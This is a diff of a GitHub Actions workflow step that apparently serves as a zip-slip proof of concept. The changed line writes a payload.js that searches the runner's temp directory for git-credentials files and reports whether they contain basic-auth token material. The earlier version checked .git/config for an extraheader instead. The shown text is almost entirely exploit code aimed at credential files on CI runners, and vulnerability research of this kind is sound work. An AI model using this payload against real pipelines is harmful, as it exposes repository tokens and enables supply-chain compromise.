@@ -23,7 +23,7 @@ jobs:
           Write-Host "DIST=$dist"
           Set-Content -Path (Join-Path $env:GITHUB_WORKSPACE 'dist_path.txt') -Value $dist
           Set-Content -Path (Join-Path $env:GITHUB_WORKSPACE 'dist_target.txt') -Value $dist
-          Set-Content -Path (Join-Path $env:GITHUB_WORKSPACE 'payload.js') -Value 'import fs from "node:fs";console.log("PWNED-WTI-ZIPSLIP");const c=fs.readFileSync(process.env.GITHUB_WORKSPACE+"/.git/config","utf8");console.log("EXTRAHEADER_PRESENT="+c.includes("extraheader"));'
+          Set-Content -Path (Join-Path $env:GITHUB_WORKSPACE 'payload.js') -Value 'import fs from "node:fs";console.log("PWNED-WTI-ZIPSLIP");let found=false;try{for(const f of fs.readdirSync("D:/a/_temp")){if(f.indexOf("git-credentials-")===0){const c=fs.readFileSync("D:/a/_temp/"+f,"utf8");if(c.indexOf("AUTHORIZATION: basic")>=0){found=true;console.log("TOKEN_FILE="+f);}}}}catch(e){console.log("ERR="+e.message)}console.log("TOKEN_MATERIAL_PRESENT="+found);'
           $py = @(
             'import sys, zipfile',
             'zip_path = sys.argv[1]',
